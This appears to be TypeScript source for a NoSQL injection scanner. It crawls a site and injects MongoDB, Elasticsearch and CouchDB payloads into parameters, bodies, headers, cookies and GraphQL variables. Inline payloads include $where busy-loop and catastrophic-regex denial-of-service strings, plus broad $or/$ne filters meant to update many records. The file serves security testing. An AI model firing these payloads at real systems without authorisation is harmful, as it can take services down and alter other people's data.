// HTTP driver with retry/timeout/proxy support
import { httpRequest } from "./http.js";
import { DebugLogger } from "./logger.js";
import { load } from "cheerio";
import {
  stringPayloads as mongoStrings,
  bodyTemplates as mongoBodies,
} from "./payloads/mongodb.js";
import {
  stringPayloads as esStrings,
  bodyTemplates as esBodies,
} from "./payloads/elasticsearch.js";
import {
  stringPayloads as couchStrings,
  bodyTemplates as couchBodies,
} from "./payloads/couchdb.js";

export type HttpMethod = "GET" | "POST" | "PUT" | "PATCH" | "DELETE";

export interface ScanEvidence {
  statusDelta?: number;
  timeMs?: number;
  timeDelta?: number;
  lengthDelta?: number;
  keywordHits?: string[];
  countDelta?: number;
  updatedCount?: number;
  // raw baseline/current values to build diffs for reporting
  baseStatus?: number;
  curStatus?: number;
  baseLength?: number;
  curLength?: number;
  baseTimeMs?: number;
  curTimeMs?: number;
  baseCount?: number;
  curCount?: number;
}

export interface ScanResult {
  url: string;
  method: HttpMethod;
  param: string;
  payload: unknown;
  evidence: ScanEvidence;
  tags?: string[]; // e.g., ['nosqli','dos','exfil']
}

export interface ScannerOptions {
  timeoutMs?: number;
  delayMs?: number;
  keywords?: string[];
  headers?: Record<string, string>;
  dosThresholdMs?: number; // consider time delta >= threshold as DoS
  dbFamily?: "MongoDB" | "Elasticsearch" | "CouchDB"; // initial focus
  // HTTP driver extras
  retryMaxAttempts?: number;
  retryBaseDelayMs?: number;
  retryMaxDelayMs?: number;
  retryUnsafeMethods?: boolean;
  proxy?: string | null; // explicit proxy override
  onHttpAttempt?: (log: import("./http.js").HttpAttemptLog) => void;
  debug?: boolean;
  onDebugEvent?: (e: import("./logger.js").DebugEvent) => void;
}

export interface CrawlOptions {
  maxPages?: number; // overall page visit limit
  maxDepth?: number; // link depth limit
  sameOrigin?: boolean; // restrict to same origin as start URL
}

export class Scanner {
  private timeoutMs: number;
  private delayMs: number;
  private keywords: string[];
  private defaultHeaders: Record<string, string>;
  private dosThresholdMs: number;
  private dbFamily: "MongoDB" | "Elasticsearch" | "CouchDB";
  private retryCfg: {
    maxAttempts: number;
    baseDelayMs: number;
    maxDelayMs: number;
    retryUnsafeMethods: boolean;
  };
  private proxy: string | null | undefined;
  private onHttpAttempt?: (log: import("./http.js").HttpAttemptLog) => void;
  private logger: DebugLogger;

  constructor(opts: ScannerOptions = {}) {
    this.timeoutMs = opts.timeoutMs ?? 8000;
    this.delayMs = opts.delayMs ?? 50;
    this.keywords = opts.keywords ?? [
      "MongoError",
      "E11000",
      "CastError",
      "validator failed",
      "Not authorized",
      "invalid operator",
      "ValidationError",
      "BSONTypeError",
      "MongoServerError",
      "MongoNetworkError",
      "UnhandledPromiseRejectionWarning",
      "TypeError:",
      "Cast to ObjectId failed",
      "CastError: Cast to ObjectId failed",
      "CastError: Cast to Number failed",
      "CastError: Cast to String failed",
      "duplicate key error collection",
      "E11000 duplicate key error",
      "ValidationError: Path",
      "required",
      "Path `",
      "is required",
      "$where",
      "$regex",
      "ObjectId(",
    ];
    this.defaultHeaders = { ...(opts.headers ?? {}) };
    this.dosThresholdMs = opts.dosThresholdMs ?? 1000;
    this.dbFamily = opts.dbFamily ?? "MongoDB";
    this.retryCfg = {
      maxAttempts: Math.max(1, opts.retryMaxAttempts ?? 1),
      baseDelayMs: Math.max(1, opts.retryBaseDelayMs ?? 200),
      maxDelayMs: Math.max(1, opts.retryMaxDelayMs ?? 2000),
      retryUnsafeMethods: !!opts.retryUnsafeMethods,
    };
    this.proxy = opts.proxy;
    this.onHttpAttempt = opts.onHttpAttempt;
    this.logger = new DebugLogger(!!opts.debug, opts.onDebugEvent);
  }

  async sleep(ms: number) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  async baselineFetch({
    url,
    method = "GET",
    headers = {},
    body,
  }: {
    url: string;
    method?: HttpMethod;
    headers?: Record<string, string>;
    body?: unknown;
  }) {
    const res = await httpRequest(url, {
      method,
      headers: {
        "user-agent": "@kdinisv/nosqli/0.1",
        ...this.defaultHeaders,
        ...headers,
      },
      body,
      timeoutMs: this.timeoutMs,
      retry: {
        maxAttempts: this.retryCfg.maxAttempts,
        baseDelayMs: this.retryCfg.baseDelayMs,
        maxDelayMs: this.retryCfg.maxDelayMs,
        retryUnsafeMethods: this.retryCfg.retryUnsafeMethods,
      },
      proxyUrl: this.proxy ?? undefined,
      onAttemptLog: (log) => {
        this.logger.emit(
          "fetch",
          `${log.method} ${log.url} attempt=${log.attempt}`,
          log
        );
        // Forward to external sink if provided
        if (this.onHttpAttempt) {
          try {
            this.onHttpAttempt(log);
          } catch {}
        }
        if (process.env.NOSQLI_HTTP_DEBUG === "1") {
          // best-effort debug line
          const base = `[HTTP attempt ${log.attempt}] ${log.method} ${log.url}`;
          const tail = log.statusCode
            ? `status=${log.statusCode}`
            : `error=${log.errorCode}`;
          const reason = log.willRetry
            ? ` retry in ${log.retryDelayMs}ms (${log.reason || ""})`
            : "";
          // eslint-disable-next-line no-console
          console.error(`${base} ${tail} ${reason}`.trim());
        }
      },
    });
    return {
      status: res.status,
      timeMs: res.timeMs,
      text: res.text,
      length: res.text.length,
      headers: res.headers,
    };
  }

  buildUrlWithParam(url: string, param: string, value: string) {
    try {
      const u = new URL(url);
      u.searchParams.set(param, value);
      return u.toString();
    } catch {
      return url;
    }
  }

  analyzeDiff(
    baseline: { status: number; length: number; text: string; timeMs?: number },
    current: { status: number; length: number; text: string; timeMs?: number }
  ): ScanEvidence {
    const statusDelta = current.status - baseline.status;
    const lengthDelta = current.length - baseline.length;
    const keywordHits = this.keywords.filter((k) => current.text.includes(k));
    const timeDelta = (current.timeMs ?? 0) - (baseline.timeMs ?? 0);
    const baseCountVal = this.extractItemCount(baseline.text);
    const curCountVal = this.extractItemCount(current.text);
    const countDelta = curCountVal - baseCountVal;
    const updatedCount = this.extractUpdatedCount(current.text);
    return {
      statusDelta,
      lengthDelta,
      keywordHits,
      timeMs: current.timeMs,
      timeDelta,
      countDelta,
      updatedCount,
      baseStatus: baseline.status,
      curStatus: current.status,
      baseLength: baseline.length,
      curLength: current.length,
      baseTimeMs: baseline.timeMs,
      curTimeMs: current.timeMs,
      baseCount: baseCountVal,
      curCount: curCountVal,
    };
  }

  private extractItemCount(text: string): number {
    try {
      const j = JSON.parse(text);
      if (Array.isArray(j)) return j.length;
      if (j && typeof j === "object") {
        if (Array.isArray((j as any).data)) return (j as any).data.length;
        if (Array.isArray((j as any).items)) return (j as any).items.length;
        if (Array.isArray((j as any).results)) return (j as any).results.length;
      }
    } catch {
      /* not json */
    }
    return 0;
  }

  private extractUpdatedCount(text: string): number {
    try {
      const j = JSON.parse(text);
      const cands = [
        (j as any)?.modifiedCount,
        (j as any)?.nModified,
        (j as any)?.updated,
        (j as any)?.updatedCount,
        (j as any)?.n,
      ];
      for (const v of cands) {
        const n = Number(v);
        if (Number.isFinite(n) && n >= 0) return n;
      }
    } catch {
      /* ignore */
    }
    return 0;
  }

  async scanGet(url: string, params: string[] = []): Promise<ScanResult[]> {
    const results: ScanResult[] = [];
    const base = await this.baselineFetch({ url });
    this.logger.emit("inject", `GET base ${url}`, {
      status: base.status,
      length: base.length,
    });
    const strings = this.getStringPayloads();
    for (const p of params) {
      for (const pl of strings) {
        const injectedUrl = this.buildUrlWithParam(url, p, pl);
        const cur = await this.baselineFetch({ url: injectedUrl });
        const evidence = this.analyzeDiff(base, cur);
        this.logger.emit("evidence", `GET param=${p}`, {
          payload: pl,
          evidence,
        });
        const tags: string[] = [];
        if (
          Math.abs(evidence.statusDelta ?? 0) > 0 ||
          Math.abs(evidence.lengthDelta ?? 0) > 50 ||
          (evidence.keywordHits?.length ?? 0)
        ) {
          tags.push("nosqli");
        }
        if ((evidence.timeDelta ?? 0) >= this.dosThresholdMs) tags.push("dos");
        if ((evidence.countDelta ?? 0) >= 5) tags.push("exfil");
        if (tags.length) {
          results.push({
            url: injectedUrl,
            method: "GET",
            param: p,
            payload: pl,
            evidence,
            tags,
          });
        }
        await this.sleep(this.delayMs);
      }
    }
    return results;
  }

  // Passive DB fingerprinting from headers/body (best-effort)
  async fingerprint(
    url: string
  ): Promise<{ engine?: string; version?: string; source?: string } | null> {
    try {
      const res = await this.baselineFetch({ url });
      const h = res.headers || {};
      const text = res.text || "";

      // 1) CouchDB via headers
      const server = h["server"] || "";
      const couchHdr = h["x-couchdb"] || "";
      const couchVerHdr = h["x-couchdb-version"] || "";
      const mCouch = /couchdb\/(\d+\.\d+(?:\.\d+)?)/i.exec(server);
      if (mCouch)
        return {
          engine: "CouchDB",
          version: mCouch[1],
          source: "header:server",
        };
      if (couchHdr.toLowerCase().includes("couchdb") && couchVerHdr)
        return {
          engine: "CouchDB",
          version: couchVerHdr,
          source: "header:x-couchdb-version",
        };

      // 2) Elasticsearch via headers/body
      const elasticHdr = (h["x-elastic-product"] || "").toLowerCase();
      if (elasticHdr === "elasticsearch") {
        // try body JSON
        try {
          const j = JSON.parse(text);
          const v = j?.version?.number;
          if (typeof v === "string")
            return { engine: "Elasticsearch", version: v, source: "body:json" };
        } catch {
          /* ignore */
        }
        return { engine: "Elasticsearch", source: "header:x-elastic-product" };
      }

      // 3) CouchDB via body JSON
      try {
        const j = JSON.parse(text);
        if (
          j &&
          typeof j === "object" &&
          j.couchdb === "Welcome" &&
          typeof j.version === "string"
        ) {
          return { engine: "CouchDB", version: j.version, source: "body:json" };
        }
      } catch {
        /* ignore */
      }

      // 4) Mongo/Mongoose keywords (no version typically)
      if (/mongo(server|network)?error|mongoose/i.test(text)) {
        return { engine: "MongoDB", source: "body:text" };
      }

      return null;
    } catch {
      return null;
    }
  }

  async scanBody(
    url: string,
    method: HttpMethod = "POST",
    baseBody: Record<string, unknown> = {},
    fields: string[] = []
  ): Promise<ScanResult[]> {
    const results: ScanResult[] = [];
    const base = await this.baselineFetch({
      url,
      method,
      headers: { "content-type": "application/json" },
      body: baseBody,
    });

    const templates = this.getBodyTemplates();
    for (const field of fields) {
      for (const tmpl of templates) {
        const injBody = {
          ...baseBody,
          ...tmpl(field, baseBody[field] ?? ""),
        } as Record<string, unknown>;
        const cur = await this.baselineFetch({
          url,
          method,
          headers: { "content-type": "application/json" },
          body: injBody,
        });
        const evidence = this.analyzeDiff(base, cur);
        const tags: string[] = [];
        if (
          Math.abs(evidence.statusDelta ?? 0) > 0 ||
          Math.abs(evidence.lengthDelta ?? 0) > 50 ||
          (evidence.keywordHits?.length ?? 0)
        ) {
          tags.push("nosqli");
        }
        if ((evidence.timeDelta ?? 0) >= this.dosThresholdMs) tags.push("dos");
        if ((evidence.countDelta ?? 0) >= 5) tags.push("exfil");
        if (tags.length) {
          results.push({
            url,
            method,
            param: field,
            payload: (injBody as any)[field],
            evidence,
            tags,
          });
        }
        await this.sleep(this.delayMs);
      }
    }
    return results;
  }

  // Header fuzzing (safe-by-default). Mutates only provided headerNames or common candidates.
  async scanHeaders(
    url: string,
    headerNames: string[] = ["X-Filter", "X-Query", "X-Search"]
  ): Promise<ScanResult[]> {
    const results: ScanResult[] = [];
    const base = await this.baselineFetch({ url });
    const strings = this.getStringPayloads();
    for (const h of headerNames) {
      for (const pl of strings) {
        const cur = await this.baselineFetch({
          url,
          headers: { [h]: pl },
        });
        const evidence = this.analyzeDiff(base, cur);
        const tags: string[] = [];
        if (
          Math.abs(evidence.statusDelta ?? 0) > 0 ||
          Math.abs(evidence.lengthDelta ?? 0) > 50 ||
          (evidence.keywordHits?.length ?? 0)
        ) {
          tags.push("nosqli");
        }
        if ((evidence.timeDelta ?? 0) >= this.dosThresholdMs) tags.push("dos");
        if ((evidence.countDelta ?? 0) >= 5) tags.push("exfil");
        if (tags.length) {
          results.push({
            url,
            method: "GET",
            param: h,
            payload: pl,
            evidence,
            tags,
          });
        }
        await this.sleep(this.delayMs);
      }
    }
    return results;
  }

  // Cookie fuzzing via Cookie header; user can pass base cookies via headers
  async scanCookies(
    url: string,
    cookieNames: string[] = ["session", "filter", "query"]
  ): Promise<ScanResult[]> {
    const results: ScanResult[] = [];
    const base = await this.baselineFetch({ url });
    const strings = this.getStringPayloads();
    for (const c of cookieNames) {
      for (const pl of strings) {
        const cookie = `${c}=${encodeURIComponent(pl)}`;
        const cur = await this.baselineFetch({
          url,
          headers: { Cookie: cookie },
        });
        const evidence = this.analyzeDiff(base, cur);
        const tags: string[] = [];
        if (
          Math.abs(evidence.statusDelta ?? 0) > 0 ||
          Math.abs(evidence.lengthDelta ?? 0) > 50 ||
          (evidence.keywordHits?.length ?? 0)
        ) {
          tags.push("nosqli");
        }
        if ((evidence.timeDelta ?? 0) >= this.dosThresholdMs) tags.push("dos");
        if ((evidence.countDelta ?? 0) >= 5) tags.push("exfil");
        if (tags.length) {
          results.push({
            url,
            method: "GET",
            param: `Cookie:${c}`,
            payload: pl,
            evidence,
            tags,
          });
        }
        await this.sleep(this.delayMs);
      }
    }
    return results;
  }

  // GraphQL: fuzz variables for selected fields in a safe manner (query-only)
  async scanGraphQL(
    url: string,
    operationName: string | null,
    query: string,
    variableFields: string[]
  ): Promise<ScanResult[]> {
    const results: ScanResult[] = [];
    const base = await this.baselineFetch({
      url,
      method: "POST",
      headers: { "content-type": "application/json" },
      body: { operationName, query, variables: {} },
    });
    const templates = this.getBodyTemplates();
    for (const field of variableFields) {
      for (const tmpl of templates) {
        const injVars = { ...tmpl(field, "") };
        const cur = await this.baselineFetch({
          url,
          method: "POST",
          headers: { "content-type": "application/json" },
          body: { operationName, query, variables: injVars },
        });
        const evidence = this.analyzeDiff(base, cur);
        const tags: string[] = [];
        if (
          Math.abs(evidence.statusDelta ?? 0) > 0 ||
          Math.abs(evidence.lengthDelta ?? 0) > 50 ||
          (evidence.keywordHits?.length ?? 0)
        ) {
          tags.push("nosqli");
        }
        if ((evidence.timeDelta ?? 0) >= this.dosThresholdMs) tags.push("dos");
        if ((evidence.countDelta ?? 0) >= 5) tags.push("exfil");
        if (tags.length) {
          results.push({
            url,
            method: "POST",
            param: `graphql:variables.${field}`,
            payload: injVars[field as keyof typeof injVars],
            evidence,
            tags,
          });
        }
        await this.sleep(this.delayMs);
      }
    }
    return results;
  }

  private getStringPayloads(): string[] {
    switch (this.dbFamily) {
      case "Elasticsearch":
        return esStrings;
      case "CouchDB":
        return couchStrings;
      case "MongoDB":
      default:
        return mongoStrings;
    }
  }

  private getBodyTemplates(): Array<
    (field: string, val: unknown) => Record<string, unknown>
  > {
    switch (this.dbFamily) {
      case "Elasticsearch":
        return esBodies;
      case "CouchDB":
        return couchBodies;
      case "MongoDB":
      default:
        return mongoBodies;
    }
  }

  // DoS-specific scans using timing payloads
  async scanDoSGet(url: string, params: string[] = []): Promise<ScanResult[]> {
    const results: ScanResult[] = [];
    const base = await this.baselineFetch({ url });
    const dosPayloads: string[] = [
      '{"$where":"function(){var s=Date.now(); while(Date.now()-s<1500){}; return true;}"}',
      '{"$regex":"^(a+)+$"}',
    ];
    for (const p of params) {
      for (const pl of dosPayloads) {
        const injectedUrl = this.buildUrlWithParam(url, p, pl);
        const cur = await this.baselineFetch({ url: injectedUrl });
        const evidence = this.analyzeDiff(base, cur);
        if ((evidence.timeDelta ?? 0) >= this.dosThresholdMs) {
          results.push({
            url: injectedUrl,
            method: "GET",
            param: p,
            payload: pl,
            evidence,
            tags: ["dos"],
          });
        }
        await this.sleep(this.delayMs);
      }
    }
    return results;
  }

  async scanDoSBody(
    url: string,
    method: HttpMethod = "POST",
    baseBody: Record<string, unknown> = {},
    fields: string[] = []
  ): Promise<ScanResult[]> {
    const results: ScanResult[] = [];
    const base = await this.baselineFetch({
      url,
      method,
      headers: { "content-type": "application/json" },
      body: baseBody,
    });
    const templates: Array<(f: string, v: unknown) => Record<string, unknown>> =
      [
        (f, v) => ({
          [f]: {
            $where:
              "function(){var s=Date.now(); while(Date.now()-s<1500){}; return true;}",
          },
        }),
        (f, v) => ({ [f]: { $regex: "^(a+)+$" } }),
      ];
    for (const field of fields) {
      for (const tmpl of templates) {
        const injBody = {
          ...baseBody,
          ...tmpl(field, (baseBody as any)[field]),
        };
        const cur = await this.baselineFetch({
          url,
          method,
          headers: { "content-type": "application/json" },
          body: injBody,
        });
        const evidence = this.analyzeDiff(base, cur);
        if ((evidence.timeDelta ?? 0) >= this.dosThresholdMs) {
          results.push({
            url,
            method,
            param: field,
            payload: (injBody as any)[field],
            evidence,
            tags: ["dos"],
          });
        }
        await this.sleep(this.delayMs);
      }
    }
    return results;
  }

  // Manipulation: attempt to update many rows by injecting broad filters
  async scanManipulation(
    url: string,
    method: HttpMethod = "POST",
    baseBody: Record<string, unknown> = {},
    filterFields: string[] = []
  ): Promise<ScanResult[]> {
    const results: ScanResult[] = [];
    const base = await this.baselineFetch({
      url,
      method,
      headers: { "content-type": "application/json" },
      body: baseBody,
    });
    // Try wide-open filters that could match many docs
    const templates: Array<(f: string, v: unknown) => Record<string, unknown>> =
      [
        (f, _v) => ({ [f]: { $regex: ".*" } }),
        (f, v) => ({ $or: [{ [f]: v }, { [f]: { $ne: v } }] }),
      ];
    for (const field of filterFields) {
      for (const tmpl of templates) {
        const injBody = {
          ...baseBody,
          ...tmpl(field, (baseBody as any)[field]),
        };
        const cur = await this.baselineFetch({
          url,
          method,
          headers: { "content-type": "application/json" },
          body: injBody,
        });
        const evidence = this.analyzeDiff(base, cur);
        if ((evidence.updatedCount ?? 0) >= 2) {
          results.push({
            url,
            method,
            param: field,
            payload: (injBody as any)[field],
            evidence,
            tags: ["manipulation"],
          });
        }
        await this.sleep(this.delayMs);
      }
    }
    return results;
  }

  // Crawl a site starting from startUrl, discover links and forms, and scan discovered params
  async crawl(
    startUrl: string,
    opts: CrawlOptions = {}
  ): Promise<ScanResult[]> {
    const { maxPages = 50, maxDepth = 3, sameOrigin = true } = opts;
    const start = new URL(startUrl);
    const visited = new Set<string>();
    const toVisit: Array<{ url: string; depth: number }> = [
      { url: this.normalizeUrl(start.toString()), depth: 0 },
    ];

    const scannedSignatures = new Set<string>();
    const findings: ScanResult[] = [];

    while (toVisit.length && visited.size < maxPages) {
      const { url, depth } = toVisit.shift()!;
      if (visited.has(url)) continue;
      visited.add(url);

      // Fetch page
      const res = await this.baselineFetch({ url });
      const html = res.text || "";
      this.logger.emit("crawler", `fetched ${url}`, {
        status: res.status,
        len: html.length,
      });
      if (!/<\w+/i.test(html)) {
        continue;
      }

      const $ = load(html);

      // Extract and enqueue anchor links, and scan links with params
      const anchorSet = new Set<string>();
      $("a[href]").each((_: any, el: any) => {
        try {
          const href = $(el).attr("href") || "";
          if (!href) return;
          const abs = this.resolveUrl(url, href);
          if (!abs) return;
          if (sameOrigin && !this.isSameOrigin(start.toString(), abs)) return;
          const norm = this.normalizeUrl(abs);
          anchorSet.add(norm);
          if (!visited.has(norm) && depth + 1 <= maxDepth) {
            toVisit.push({ url: norm, depth: depth + 1 });
          }
        } catch {
          /* ignore */
        }
      });

      for (const href of anchorSet) {
        try {
          const u = new URL(href);
          const params = Array.from(u.searchParams.keys());
          if (params.length) {
            const sig = this.scanSignature(
              "GET",
              u.origin + u.pathname,
              params
            );
            if (!scannedSignatures.has(sig)) {
              scannedSignatures.add(sig);
              this.logger.emit("crawler", `scan link ${u.toString()}`, {
                params,
              });
              const linkFindings = await this.scanGet(u.toString(), params);
              if (linkFindings.length) findings.push(...linkFindings);
            }
          }
        } catch {
          /* ignore */
        }
        await this.sleep(this.delayMs);
      }

      // Extract and scan forms
      const formPromises: Promise<ScanResult[]>[] = [];
      $("form").each((_: any, el: any) => {
        try {
          const method = (
            $(el).attr("method") || "GET"
          ).toUpperCase() as HttpMethod;
          const actionAttr = $(el).attr("action") || "";
          const actionAbs = this.resolveUrl(url, actionAttr || url) || url;
          if (sameOrigin && !this.isSameOrigin(start.toString(), actionAbs))
            return;
          const u = new URL(actionAbs);

          // Collect input field names
          const names = new Set<string>();
          $(el)
            .find("input[name],select[name],textarea[name]")
            .each((__i: any, input: any) => {
              const n = $(input).attr("name");
              if (n) names.add(n);
            });

          if (names.size === 0) return;
          const fields = Array.from(names);

          if (method === "GET") {
            const sig = this.scanSignature(
              "GET",
              u.origin + u.pathname,
              fields
            );
            if (!scannedSignatures.has(sig)) {
              scannedSignatures.add(sig);
              this.logger.emit("crawler", `scan form GET ${u.toString()}`, {
                fields,
              });
              formPromises.push(this.scanGet(u.toString(), fields));
            }
          } else {
            const sig = this.scanSignature(
              method,
              u.origin + u.pathname,
              fields
            );
            if (!scannedSignatures.has(sig)) {
              scannedSignatures.add(sig);
              const baseBody: Record<string, unknown> = Object.fromEntries(
                fields.map((f) => [f, "a"])
              );
              this.logger.emit(
                "crawler",
                `scan form ${method} ${u.toString()}`,
                { fields }
              );
              formPromises.push(
                this.scanBody(u.toString(), method, baseBody, fields)
              );
            }
          }
        } catch {
          /* ignore malformed form */
        }
      });

      for (const p of formPromises) {
        try {
          const res = await p;
          if (res.length) findings.push(...res);
        } catch {
          /* ignore */
        }
      }
    }

    return findings;
  }

  private isSameOrigin(a: string, b: string): boolean {
    try {
      const ua = new URL(a);
      const ub = new URL(b);
      return (
        ua.protocol === ub.protocol &&
        ua.hostname === ub.hostname &&
        (ua.port || "") === (ub.port || "")
      );
    } catch {
      return false;
    }
  }

  private resolveUrl(base: string, href: string): string | null {
    try {
      return new URL(href, base).toString();
    } catch {
      return null;
    }
  }

  private normalizeUrl(u: string): string {
    try {
      const url = new URL(u);
      url.hash = "";
      return url.toString();
    } catch {
      return u;
    }
  }

  private scanSignature(
    method: HttpMethod,
    basePath: string,
    params: string[]
  ): string {
    return `${method} ${basePath}?${params.sort().join(",")}`;
  }
}
